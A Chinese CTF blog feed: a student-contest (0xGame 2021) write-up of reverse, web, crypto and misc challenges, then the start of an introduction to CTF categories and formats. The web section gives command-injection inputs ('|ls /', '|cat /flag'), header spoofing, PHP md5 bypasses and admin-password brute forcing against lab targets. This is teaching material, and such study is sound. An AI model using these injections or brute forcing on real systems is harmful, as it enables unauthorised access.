0xGame&#123;b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Zero-Three"><a href="#Zero-Three" class="headerlink" title="Zero Three"></a>Zero Three</h3><p>z3 使用一下，就能解出flag</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from z3 import *import libnump &#x3D; [Int(&#39;x%d&#39;%i) for i in range(0,32)]num &#x3D; [Int(&#39;u%d&#39;%i) for i in range(0,8)]s &#x3D; Solver()for i in range(0,32):    s.add(p[i] &gt; 0x20)    s.add(p[i] &lt; 127)s.add(2 * p[5] + 8225 - p[0] - 9 * p[3] - p[4] - p[9] + p[10] - 6 * p[11] - p[13] - 3 * p[14] - 5 * p[15] &#x3D;&#x3D; 5643)s.add(3 * p[14] + 8 * p[10] -3  * p[2] - 6 * p[0] + 8225 - p[1] - 2 * p[5] + 3 * p[8] - 8 * p[11] + 4 * p[12] - 6 * p[15] &#x3D;&#x3D; 6620)s.add(-5 * p[12] - 7 * p[6] - 3 * p[1] + 8225 - 2 * p[0] - p[2] - 5 * p[3] - 7 * p[4] - 6 * p[5] - 2 * p[8] + 6 * p[13] &#x3D;&#x3D; 5538)s.add(2 * p[5] + 2 * p[1] + 8225 - 2 * p[0] - 2 * p[3] + 3 * p[4] - 2 * p[8] - p[10] - p[12] - 2 * p[14] - 2 * p[15] &#x3D;&#x3D; 7693)s.add(-6 * p[14] + 8225 - 2 * p[1] - 2 * p[2] - 9 * p[3] + 2 * p[4] - 5 * p[7] + 2 * p[8] - 9 * p[9] - 4 * p[10] - 6 * p[15] &#x3D;&#x3D; 4735)s.add(9 * p[14] - 7 * p[10] + 8 * p[9] + 5 * p[0] + 8225 - p[2] + p[5] - 5 * p[6] - 8 * p[11] - p[12] - 9 * p[15] &#x3D;&#x3D; 7060)s.add(p[13] - 5 * p[7] - 3 * p[2] - 3 * p[0] + 8225 - 4 * p[1] - 4 * p[4] - p[6] + 9 * p[10] - 2 * p[14] - 6 * p[15] &#x3D;&#x3D; 5864)s.add(-9 * p[14] - 3 * p[10] + 9 * p[1] - 6 * p[0] + 8225 - 5 * p[3] - 4 * p[7] - 2 * p[11] - 2 * p[12] + p[13] + 9 * p[15] &#x3D;&#x3D; 7393)s.add(6 * p[9] - 5 * p[8] - 3 * p[6] + 9 * p[2] + 8225 - p[4] + 3 * p[5] - 7 * p[7] + 7 * p[10] - 2 * p[13] - p[14] &#x3D;&#x3D; 8442)s.add(8 * p[6] - 7 * p[2] + 8225 - 8 * p[1] - p[3] + 6 * p[4] - p[7] + 5 * p[8] - 4 * p[10] - p[14] + 7 * p[15] &#x3D;&#x3D; 8376)for i in range(0,32,4):    s.add(num[i&#x2F;&#x2F;4] &#x3D;&#x3D; (p[i] + (p[i+1] * 256) + (p[i+2] * 65536) + (p[i+3] * 16777216)))s.add(-22827 * num[4] + 21984 * num[1] - 38534 * num[5] - 32344 * num[0] &#x3D;&#x3D; -98460819657603)s.add(-38215 * num[2] - 37324 * num[4] - 8436 * num[5] + 15405 * num[0] &#x3D;&#x3D; -131665436206262)s.add(10926 * num[7] - 28942 * num[1] - 34572 * num[3] - 10538 * num[5] &#x3D;&#x3D; -121891239772992)s.add(-30117 * num[6] - 22990 * num[2] - 20471 * num[5] + 34494 * num[7] &#x3D;&#x3D; -57089882568260)s.add(-33112 * num[5] - 19335 * num[4] + 34348 * num[1] + 31445 * num[2] &#x3D;&#x3D; 56335531538050)s.add(-13566 * num[5] + 14758 * num[0] - 19814 * num[2] - 26447 * num[4] &#x3D;&#x3D; -81105980248303)s.add(25898 * num[5] - 15817 * num[1] + 20463 * num[7] - 33578 * num[0] &#x3D;&#x3D; -28860618440412)s.add(-35429 * num[7] + 36594 * num[2] - 28801 * num[6] - 14952 * num[3] &#x3D;&#x3D; -45384029412201)print(s.check())if s.check() &#x3D;&#x3D; sat:    flag &#x3D; b&quot;&quot;    result &#x3D; s.model()    for i in range(0,8):        print(num[i], result[num[i]])    for i in range(0,8):        flag +&#x3D; libnum.n2s(result[num[i]].as_long())[::-1]    flag &#x3D; &quot;0xGame&#123;&quot; + str(flag, encoding &#x3D; &quot;utf-8&quot;) + &quot;&#125;&quot;    print(flag)# 0xGame&#123;udydYCBxUB6vqsAt5VCs6LKDRqXLUhSW&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="看看我的头"><a href="#看看我的头" class="headerlink" title="看看我的头"></a>看看我的头</h3><p>这个题主要是考察请求头的结构大概了解每部分都有什么作用。</p><p>点进题目，先是打开方式不对，这很容易想到是请求方式不对，把GET请求方式改为POST，可以看到网页提示变化。再是提示要使用<code>N1k0la浏览器</code>。请求头中User-Agent向访问网站提供你所使用的浏览器类型、操作系统及版本、CPU 类型、浏览器渲染引擎、浏览器语言、浏览器插件等信息的标识。所以我们在这添加<code>N1k0la</code>。页面又发生变化，提示要本地登陆，所以我们添加X-Forwarded-For头去伪造我们的来源ip为本地ip：127.0.0.1 </p><p>然后会得到一串base64编码的数据解码后是</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0xGame2021'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'X1cT34m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Pupi1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token string single-quoted-string">'welcome to the0xGame2021'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$a</span><span class="token operator">===</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里是一个php的弱类型，md5碰撞，有多种方式去做</p><ol><li>md5()返回32位字符串，若均为<strong>0e</strong>开头可被认为是科学计数法表示的数字<strong>0</strong></li><li>md5()处理不了数组，会报错并返回NULL值。所以2个变量的md5值会相同</li><li>因为这里没有对是否传入变量进行判断，所以不传入md5处理的那2个变量，md5() 会直接输出<code>d41d8cd98f00b204e9800998ecf8427e</code> 代表空。</li><li>当然也可以直接传入2个一样的值 :-)</li></ol><h3 id="看看你能登陆吗"><a href="#看看你能登陆吗" class="headerlink" title="看看你能登陆吗"></a>看看你能登陆吗</h3><p>这个题主要是为了让新生熟悉burpsuit的操作，了解web渗透的本质是信息搜集。</p><p>题目说了登陆的关键词，自然想到可能存在后台，直接试常见的后台路径，或者使用目录扫描器扫描后台路径。发现<code>/admin</code>存在访问发现后台。有提示说密码是4位纯数字，常识可知后台的用户名大部分为admin，所以我们爆破密码。这里可以使用burpsuit，或者python写脚本，只是这里密码故意设为0310（出题人的生日，嘻嘻  所以在爆破密码时要注意0开头的4个数字也是合理的。爆破登陆即可。</p><h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>Robots协议了解一下。</p><p>robots.txt会被放在网站根目录下，告诉爬虫哪些不能爬，哪些能爬。 直接访问</p><p><code>/robots.txt</code>得到提示4ll.html，之后直接访问<code>/4ll.html</code>F12查看网页源代码，即可得到。</p><h3 id="爱ping才会赢"><a href="#爱ping才会赢" class="headerlink" title="爱ping才会赢"></a>爱ping才会赢</h3><p>这个题主要考察linux下的命令执行。</p><p>首先发现带有Ping字样的按钮是不可点击的，F12后将对应处的disabled=”disabled”删除即可点中。</p><p>这里实现ping的功能猜测是使用了调用系统命令的函数，所以我们可以进行命令拼接。</p><p>在linux中; |等<strong>连接符</strong>可连接两个独立语句并执行</p><p><code>|ls /</code>所以我们传入这个就可以查看根目录下的文件，找到flag后直接传入<code>|cat /flag</code>即可</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto-Sign-in"><a href="#Crypto-Sign-in" class="headerlink" title="Crypto Sign in"></a>Crypto Sign in</h3><p>下载附件，阅读一下入门指南，最后就有flag。</p><h3 id="CuteCaesar"><a href="#CuteCaesar" class="headerlink" title="CuteCaesar"></a>CuteCaesar</h3><p>这题其实拿到附件，可以直接复制附件嗷呜嗷呜的内容去必应搜索，就能找到相关内容，可以知道需要兽语解码，当然第一天之后给了hint，大家也都很快找到了这个解码器。解码之后是</p><pre class="line-numbers language-none"><code class="language-none">0aJdph&#123;fdhvdu_1v_q0w_fxwh&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里根据题目名字，就可以知道是凯撒加密，百度找一个凯撒密码的解密器，位移量是3，解密即可。</p><h3 id="manycode"><a href="#manycode" class="headerlink" title="manycode"></a>manycode</h3><p>这题套娃层数有点多，给大家添堵了，在这里道歉了。一开始的层数更多，后来想了想有些编码不是很常用，就去了两层，并且给了提示，搜索ctf常见编码，一个个比照就可以一层层解密。主要希望大家能掌握Base64、32、16这三种常见编码的形式。</p><p>首先是aaencode，找一个在线解码器即可，网上说的在控制台运行会报错，可能是js的新语法规定 “_” 不能定义变量。然后就是三层base解码，依次是base16，base32，base64。最后就可以得到flag。</p><h3 id="ezVigenere"><a href="#ezVigenere" class="headerlink" title="ezVigenère"></a>ezVigenère</h3><p>这题的做法很多，有的同学是写程序爆破key，有的同学是根据最后flag的格式0xGame，从而推断key为abc，当然也有同学找了一个网址，里面的key默认是abc，直接解密（大意了，忘改key了）。这里给大家推荐一个网站，网站是通过词频分析，破解维吉尼亚密码的，直接复制进去解密即可。<a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p><h3 id="MyFunction"><a href="#MyFunction" class="headerlink" title="MyFunction"></a>MyFunction</h3><p>一个函数，这个函数是已知$y=x\ln x$,求$x$的结果。<br>这个题是模仿西电新生赛的函数题出的，那边用的是$y=e^x$，这个函数有反函数$y=\ln x$。但$y=x\ln x$没有反函数，但根据这个函数在$[1,+∞)$单调增，因此我们一个一个枚举它的值就行了。可能要考虑一下浮点误差(但实测并不需要)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> math <span class="token keyword">import</span> logs<span class="token operator">=</span><span class="token string">""</span>D<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>D<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    y<span class="token operator">=</span><span class="token builtin">float</span><span class="token punctuation">(</span>D<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>x<span class="token operator">*</span>log<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">-</span>y<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0.003</span><span class="token punctuation">:</span>            s<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment">#0xGame&#123;YouH4veKn0wedPy7honL081s&lt;y=ln(x)>InM47hs&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不过多数人是Excel打表、或者一个一个算的。直接开脚本写的不多。</p><h3 id="Class-8"><a href="#Class-8" class="headerlink" title="Class 8"></a>Class 8</h3><p>八种古典密码（可能确实出得有点脑洞了）</p><pre class="line-numbers language-none"><code class="language-none">第1、6位是盲文第2、7位是跳舞的小人第3位是猪圈密码第4、11、16位是手机九键键盘第5、9、14位是莫尔斯电码第8、12位是银河字母第10、15位是培根密码第13位是电脑键盘，cfgb之间围着的是V<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这道题一开始打算出规则的单词的，但后面就出得不规则了。主要是第13位、第15位出问题出得比较多。第15位确实有两种解法，因此第15位是<code>O</code>最后也算对了。</p><p>flag:<code>0xGame&#123;CLASSLNRDDLDVTNB&#125;</code>或<code>0xGame&#123;CLASSLNRDDLDVTOB&#125;</code></p><h3 id="ABC-Of-RSA"><a href="#ABC-Of-RSA" class="headerlink" title="ABC Of RSA"></a>ABC Of RSA</h3><p>这个题是后面加的。主要是给新生入门一下RSA。。。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">在RSA加密中，已知：p<span class="token operator">=</span><span class="token number">9677</span>q<span class="token operator">=</span><span class="token number">9241</span>e<span class="token operator">=</span><span class="token number">10009</span>求解密指数d不超过<span class="token number">4000</span>万的正值，用十进制表示，包上0xGame<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>提交。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>百度百科上就有很多关于RSA的加密方法和解密方法。如果用上Crypto包，是非常好做的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token punctuation">,</span>q<span class="token operator">=</span><span class="token number">9677</span><span class="token punctuation">,</span><span class="token number">9241</span>phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>inverse<span class="token punctuation">(</span><span class="token number">10009</span><span class="token punctuation">,</span>phi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#39982249</span><span class="token comment">#flag是0xGame&#123;39982249&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也有很多学弟学妹们用的是逆元的定义：$10009d= 1 +k \phi$做出来的，通过枚举$k$，找到了$d$的值。。不过这一方法在下一个RSA中就不太适用了，因为下一题的$k$很大，没法枚举了。</p><h3 id="BlackGiveRSA"><a href="#BlackGiveRSA" class="headerlink" title="BlackGiveRSA"></a>BlackGiveRSA</h3><p>一个RSA题目，看到$n$比较小，那么$n$的值直接放入网站/yafu/sagemath中分解就行了。<br>分解出$p=1175078221,q=1435756429$。然后对输出内容一段一段解密，再<code>long_to_bytes</code>连接起来，就是flag了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token punctuation">,</span>q<span class="token operator">=</span><span class="token number">1175078221</span><span class="token punctuation">,</span><span class="token number">1435756429</span>n<span class="token punctuation">,</span>phi<span class="token operator">=</span>p<span class="token operator">*</span>q<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>inverse<span class="token punctuation">(</span><span class="token number">10007</span><span class="token punctuation">,</span>phi<span class="token punctuation">)</span>cipher<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token number">1150947306854980854</span><span class="token punctuation">,</span>    <span class="token number">243703926267532432</span><span class="token punctuation">,</span>    <span class="token number">1069319314811079682</span><span class="token punctuation">,</span>    <span class="token number">688582941857504686</span><span class="token punctuation">,</span>    <span class="token number">670683629344243145</span><span class="token punctuation">,</span>    <span class="token number">1195068175327355214</span>    <span class="token punctuation">]</span>m<span class="token operator">=</span><span class="token string">b""</span><span class="token keyword">for</span> c <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>    m<span class="token operator">+=</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token comment">#0xGame&#123;ChuTiRenDeQQShiJiShangJiuShiQDeZhi&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag解出来：“出题人的QQ实际上就是q的值。”，各位学弟学妹们可以看看自己QQ是不是素数，平均30几个QQ号就有一个是素数。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h3><p>直接看RULES就行</p><h3 id="A-translate-draft"><a href="#A-translate-draft" class="headerlink" title="A translate draft"></a>A translate draft</h3><p>下载附件，打开提示需要输入密码，是伪加密。扔进winhex，搜索504B0102，往后看加密位置，是0900，更改为0000。打开文件，将word文档解压出来，打开，下拉到最下方，有一段空白，全选更改字体颜色为红色可以看到b32加密的串，解出前半段flag。将word改为zip，打开发现HiddenBy13.txt，内容为rot13加密的后半段flag。</p><h3 id="认真的血"><a href="#认真的血" class="headerlink" title="认真的血"></a>认真的血</h3><p>NTFS文件流隐写，使用winrar解压文件，使用ntfsstreameditor扫描得到flag.txt，内容为ROT47加密，解密得flag。</p><h3 id="Kakurennbo"><a href="#Kakurennbo" class="headerlink" title="Kakurennbo"></a>Kakurennbo</h3><p>光标在文本内停留，按→键会发现有明显的阻滞感。这显然是0宽隐写。验证：在kali下使用vim打开文本，可以发现0宽字符。在线解密<a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p><p>可以得到W型栅栏加密过的flag。<a href="http://www.atoolbox.net/Tool.php?Id=777%E8%A7%A3%E5%AF%86%EF%BC%8C%E6%A0%8F%E6%95%B021%E5%BE%97%E5%88%B0flag%E3%80%82">http://www.atoolbox.net/Tool.php?Id=777解密，栏数21得到flag。</a></p><h3 id="EzAlgorithm"><a href="#EzAlgorithm" class="headerlink" title="EzAlgorithm"></a>EzAlgorithm</h3><p>一个简单的算法题：因为第$i$级楼梯可以通过第$i-1,i-2,i-3$级楼梯到达，因此到达第$i$级楼梯的走法等于到达第$i-1$级楼梯的走法加上到达第$i-2$级楼梯的走法加上到达第$i-3$级楼梯的走法。</p><p>不过在这之前，我们要判断一下楼梯有没有坏掉。如果楼梯坏掉了，那么我们就直接把到达那一级楼梯的方法数记为$0$就行。</p><p>这边需要注意的是，由于模数$1435756429$比<code>C/C++ int</code>的最大值的一半要大，那这里需要开<code>long long</code>解决。</p><p>这是解题代码（C语言的，C++/Python也可以做。），最后是十个测试点的答案。需要注意的是有一个点有点坑，因为那个点它第一级楼梯就是坏的：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;long long f[4000000]&#x3D;&#123;0&#125;,v[4000000]&#x3D;&#123;0&#125;;int n,k;int main()&#123;FILE *fp&#x3D;fopen(&quot;testdata10.in&quot;,&quot;r&quot;);&#x2F;&#x2F;这边的数字从1到10挨个修改，运行一遍就行FILE *gp&#x3D;fopen(&quot;result.out&quot;,&quot;a&quot;);int i,j;fscanf(fp,&quot;%d%d&quot;,&amp;n,&amp;k);for(i&#x3D;1;i&lt;&#x3D;k;i++)&#123;int x;fscanf(fp,&quot;%d&quot;,&amp;x);v[x]&#x3D;1;&#125;if(!v[1]) f[1]&#x3D;1;if(!v[2]) f[2]&#x3D;f[1]+1;if(!v[3]) f[3]&#x3D;f[1]+f[2]+1;for(i&#x3D;4;i&lt;&#x3D;n;i++)&#123;if(v[i]&#x3D;&#x3D;1)f[i]&#x3D;0;elsef[i]&#x3D;(f[i-1]+f[i-2]+f[i-3])%1435756429;&#125;fprintf(gp,&quot;%lld\n&quot;,f[n]%1435756429);fclose(fp);fclose(gp);&#125;&#x2F;&#x2F;13 98 47 3359124 1205125 834118675 1289432148 1087983205 1176572515 566575482<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这些数加起来模$1435756429$的值为$651977145$，所以flag为<code>0xGame&#123;651977145&#125;</code>。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF简介</title>
      <link href="/2021/10/09/CTF%E7%AE%80%E4%BB%8B/"/>
      <url>/2021/10/09/CTF%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一、CTF简介"><a href="#一、CTF简介" class="headerlink" title="一、CTF简介"></a>一、CTF简介</h1><p>  Capture The Flag（以下简称”CTF”）,顾名思义，即是夺取旗帜，由于相关介绍已经比较完全完全，其简介可见百度知道:<a href="https://baike.baidu.com/item/CTF/9548546?fr=aladdin">CTF</a>词条。</p><h1 id="二、CTF的题目类型"><a href="#二、CTF的题目类型" class="headerlink" title="二、CTF的题目类型"></a>二、CTF的题目类型</h1><p>​    CTF的题目类型大致包括以下五种： <a href="#Web">Web</a>，<a href="#Pwn">Pwn</a>，<a href="#Misc">Misc</a>， <a href="#Reverse">Reverse</a>，<a href="#Crypto">Crypto</a></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>​    Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如<code>SQL注入</code>、<code>XSS</code>、<code>代码执行</code>、<code>代码审计</code>等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件.</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>​    Pwn类题目重点考察选手对于<code>二进制漏洞的挖掘和利用</code>能力，其考点也通常在<code>堆栈溢出</code>、<code>格式化漏洞</code>、<code>UAF</code>、<code>Double Free</code>等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(<code>Exploit</code>)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为<code>nc IP_ADDRESS PORT</code>，例如<code>nc 1.2.3.4 4567</code>这种形式，表示在<code>1.2.3.4</code>这个IP的<code>4567</code>端口上运行了该题目</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><pre><code>Misc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag</code></pre><p>   常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>​    Reverse题目考察选手<code>逆向工程</code>能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>​    Crypto类题目考察选手对<code>密码学</code>相关知识的了解程度，诸如<code>RSA</code>、<code>AES</code>、<code>DES</code>等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。</p><h1 id="三、CTF的比赛形式"><a href="#三、CTF的比赛形式" class="headerlink" title="三、CTF的比赛形式"></a>三、CTF的比赛形式</h1><p>  CTF的比赛形式主要包括以下几种：<a href="#%E7%90%86%E8%AE%BA%E7%B1%BB">理论类</a>，[Jeopardy 解题]( #Jeopardy 解题)，[AwD 攻防](# AwD 攻防)，[RHG 自动化](#RHG 自动化)，[RW 真实世界](#RW 真实世界)，[KoH 抢占山头](#KoH 抢占山头)，[MIX 混合](#Mix  混合)</p><h2 id="理论类"><a href="#理论类" class="headerlink" title="理论类"></a>理论类</h2><p>​    理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选</p><h2 id="Jeopardy-解题"><a href="#Jeopardy-解题" class="headerlink" title="Jeopardy 解题"></a>Jeopardy 解题</h2><p>​    参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。 不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。 当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为动态积分 题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。</p><h2 id="AwD-攻防"><a href="#AwD-攻防" class="headerlink" title="AwD 攻防"></a>AwD 攻防</h2><p>​    <strong>A</strong>ttack <strong>w</strong>ith <strong>D</strong>efense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为GameBox，每个队伍之间的GameBox配置及漏洞是完全一致的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为Checker的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。 AwD通常仅包含Web及Pwn两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。</p><h2 id="RHG-自动化"><a href="#RHG-自动化" class="headerlink" title="RHG 自动化"></a>RHG 自动化</h2><p>​    <strong>R</strong>obo <strong>H</strong>acking <strong>G</strong>ame(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于漏洞理解以及工程化能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为bot，在程序中全自动访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。 比赛过程中不允许选手对bot进行任何的操作(包括debug/patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。</p><h2 id="RW-真实世界"><a href="#RW-真实世界" class="headerlink" title="RW 真实世界"></a>RW 真实世界</h2><p>​    <strong>R</strong>eal <strong>W</strong>orld(RW) 首次于2018年长亭科技主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM/Docker逃逸、针对浏览器的攻击、针对IoT/Car等设备的攻击，Web类攻击等等 在RW赛制中会有一个Show 